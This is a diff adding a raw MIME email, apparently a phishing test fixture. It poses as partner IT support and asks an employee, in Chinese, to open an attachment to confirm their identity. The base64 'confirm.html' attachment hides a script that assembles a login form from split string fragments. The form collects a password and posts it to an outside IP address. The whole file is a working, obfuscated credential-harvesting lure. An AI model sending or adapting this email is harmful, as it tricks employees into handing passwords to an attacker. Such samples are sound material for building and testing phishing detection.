@@ -1,0 +1,19 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev29@partner.example>
+Subject: 身份确认
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+您好，请打开附件完成身份确认。--BS
+Content-Type: text/html
+Content-Disposition: attachment; filename="confirm.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGRpdiBpZD0neCc+PC9kaXY+PHNjcmlwdD52YXIgaD0nPGZvJysncm0gYWN0JysnaW9uPWh0JysndHA6Ly8yMDMuMC4xMTMuNjAvbG8nKydnaW4+JztoKz0nPGluJysncHV0IG5hbWU9cGFzcyB0eScrJ3BlPXBhc3MnKyd3b3JkPic7aCs9JzxidScrJ3R0b24+56GuJysn6K6kPC9idScrJ3R0b24+PC9mbycrJ3JtPic7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3gnKS5pbm5lckhUTUw9aDs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==
+--BS--
+
